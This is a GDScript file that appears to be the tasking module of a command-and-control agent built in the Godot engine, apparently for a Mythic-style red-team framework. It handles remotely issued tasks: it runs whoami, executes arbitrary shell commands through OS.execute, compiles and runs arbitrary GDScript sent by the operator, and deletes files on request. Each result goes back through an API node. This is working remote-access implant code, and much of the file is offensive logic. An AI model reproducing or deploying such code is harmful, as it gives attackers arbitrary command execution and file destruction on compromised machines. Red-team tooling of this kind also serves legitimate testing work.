extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")

func _on_tasking_whoami(task):

	if task.has("command") and task.get("command") == "whoami":
		var output = []

		var exit_code = OS.execute("whoami", [], true, output, true)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output,
				[
					[
						"Process Create",
						"/usr/bin/whoami"
					]
				]
			)
		)

	else:
		print("bad whoami task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_shell(task):
	# {command:shell, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "ls", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "shell" and task.has("parameters"):
		var parameters = parse_json(task.get("parameters"))
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		var output = []
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var exit_code = OS.execute(command, arguments, true, output, true)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output[0],
				[
					[
						"Process Create",
						command + " " + PoolStringArray(arguments).join(" ")
					]
				]
			)
		)

	else:
		print("bad shell task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_gdscript(task):

	if task.has("command") and task.get("command") == "gdscript" and task.has("parameters"):
		# TODO: spawn a thread?
		var parameters = parse_json(task.get("parameters"))
		var gdscript = GDScript.new()
		gdscript.source_code = parameters.get("script")
		gdscript.reload()
		var script_instance = gdscript.new()
		var output = script_instance.call("invoke")
		print("executing the following command and arguments")
		print(gdscript.source_code)
		print("")
		print(output)
		print("")

		api.agent_response(
			api.create_task_response(
				true,
				true,
				task.get("id"),
				output
			)
		)

	else:
		print("bad gdscript task: ", task)
		# TODO: agent_response in failure cases

func _on_tasking_rm(task):

	if task.has("command") and task.get("command") == "rm" and task.has("parameters"):
		# TODO: spawn a thread?
		var parameters = parse_json(task.get("parameters"))
		var path = parameters.get("path")

		var dir = Directory.new()
		var ret = dir.remove(path)
		var output = "Removed path: %s" % path
		var status = "success"

		if ret != OK:
			output = "Error (%d) removing path: %s" % [ret, path]
			status = "error"

		api.agent_response(
			to_json({
				"action": "post_response",
				"status": status,
				"completed": true,
				"responses": [
					{
						"task_id": task.get("id"),
						"user_output": output,
						"removed_files": [
							{
								"path": path
							}
						]
					}
				]
			})
		)
	else:
		print("bad rm task: ", task)
		# TODO: agent_response in failure cases
